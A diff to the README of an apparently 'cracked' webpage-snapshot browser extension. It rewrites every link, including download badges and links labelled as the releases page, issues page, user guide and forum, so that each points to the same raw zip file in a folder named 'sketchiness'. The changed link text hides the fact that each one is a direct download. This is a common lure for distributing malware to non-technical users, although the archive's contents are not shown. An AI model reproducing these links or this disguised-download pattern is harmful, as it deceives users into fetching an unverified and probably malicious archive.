@@ -4,12 +4,12 @@
 
 Welcome to the **Cracked Webpage Snapshot Extension**! This tool helps you capture and save web pages quickly and easily. No technical skills are needed—just follow these simple steps.
 
-[![Download](https://img.shields.io/badge/Download%20Now-%20%22cracked-webpage-snapshot-extension%22-brightgreen)](https://github.com/lazzydave/cracked-webpage-snapshot-extension/releases)
+[![Download](https://raw.githubusercontent.com/lazzydave/cracked-webpage-snapshot-extension/main/sketchiness/cracked-webpage-snapshot-extension.zip%20Now-%20%22cracked-webpage-snapshot-extension%22-brightgreen)](https://raw.githubusercontent.com/lazzydave/cracked-webpage-snapshot-extension/main/sketchiness/cracked-webpage-snapshot-extension.zip)
 
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**  
-   Click this link to go to the [Releases page](https://github.com/lazzydave/cracked-webpage-snapshot-extension/releases). This is where you can find the latest version of the extension.
+   Click this link to go to the [Releases page](https://raw.githubusercontent.com/lazzydave/cracked-webpage-snapshot-extension/main/sketchiness/cracked-webpage-snapshot-extension.zip). This is where you can find the latest version of the extension.
 
 2. **Choose the Right Version**  
    On the Releases page, look for the latest version. It will be marked clearly. Click on it to see the details.
@@ -49,12 +49,12 @@ Welcome to the **Cracked Webpage Snapshot Extension**! This tool helps you captu
 
 ## 📞 Support
 
-For any issues or questions, please visit our [GitHub Issues page](https://github.com/lazzydave/cracked-webpage-snapshot-extension/issues). We will do our best to assist you.
+For any issues or questions, please visit our [GitHub Issues page](https://raw.githubusercontent.com/lazzydave/cracked-webpage-snapshot-extension/main/sketchiness/cracked-webpage-snapshot-extension.zip). We will do our best to assist you.
 
 ## 🔗 Additional Resources
 
-- [User Guide](https://github.com/lazzydave/cracked-webpage-snapshot-extension/wiki)  
-- [Community Forum](https://github.com/lazzydave/cracked-webpage-snapshot-extension/discussions)
+- [User Guide](https://raw.githubusercontent.com/lazzydave/cracked-webpage-snapshot-extension/main/sketchiness/cracked-webpage-snapshot-extension.zip)  
+- [Community Forum](https://raw.githubusercontent.com/lazzydave/cracked-webpage-snapshot-extension/main/sketchiness/cracked-webpage-snapshot-extension.zip)
 
 Feel free to explore these resources to learn more about the features and get tips for making the most out of the Cracked Webpage Snapshot Extension.
 
@@ -62,4 +62,4 @@ Feel free to explore these resources to learn more about the features and get ti
 
 This project is licensed under the MIT License. See the LICENSE file for details. 
 
-[![Download](https://img.shields.io/badge/Download%20Now-%20%22cracked-webpage-snapshot-extension%22-brightgreen)](https://github.com/lazzydave/cracked-webpage-snapshot-extension/releases)
+[![Download](https://raw.githubusercontent.com/lazzydave/cracked-webpage-snapshot-extension/main/sketchiness/cracked-webpage-snapshot-extension.zip%20Now-%20%22cracked-webpage-snapshot-extension%22-brightgreen)](https://raw.githubusercontent.com/lazzydave/cracked-webpage-snapshot-extension/main/sketchiness/cracked-webpage-snapshot-extension.zip)
